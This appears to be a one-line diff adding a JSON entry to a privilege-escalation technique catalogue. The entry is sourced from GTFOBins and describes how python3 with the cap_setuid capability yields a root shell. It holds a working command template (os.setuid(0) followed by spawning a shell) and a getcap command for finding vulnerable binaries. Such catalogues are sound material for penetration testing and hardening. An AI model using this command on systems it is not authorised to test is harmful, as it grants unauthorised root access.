@@ -1,0 +1,1 @@
+{"id":"cap_setuid_python3","category":"CAPABILITY_SETUID","binary":"python3","cve":null,"exploitation":["{{binary}} -c 'import os; os.setuid(0); os.system(\"{{shell}}\")'"],"post_exploit":["id"],"notes":"Binary must have cap_setuid+ep. Verify: getcap -r / 2>/dev/null","source":"gtfobins.github.io","tags":["capabilities","setuid"],"severity":"high"}
